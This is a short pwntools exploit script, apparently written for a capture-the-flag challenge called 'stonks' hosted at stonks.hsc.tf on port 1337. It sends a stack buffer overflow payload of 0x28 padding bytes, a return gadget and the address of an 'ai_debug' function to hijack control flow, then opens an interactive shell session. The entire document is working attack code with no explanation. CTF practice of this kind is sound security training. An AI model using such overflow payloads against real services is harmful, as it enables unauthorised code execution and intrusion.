from pwn import *

e = ELF("./stonks")
#libc = ELF("./libc.so.6")

context.binary = e.path

is_remote = "--remote" in sys.argv
def debug():
  if not is_remote:
    gdb.attach(p)

if is_remote:
  p = remote("stonks.hsc.tf", 1337)
else:
  p = process(e.path)
  #, env={"LD_PRELOAD": libc.path})


debug()
p.sendlineafter(":", "A" * 0x28 + p64(0x401257) + p64(e.symbols["ai_debug"]))


p.interactive()
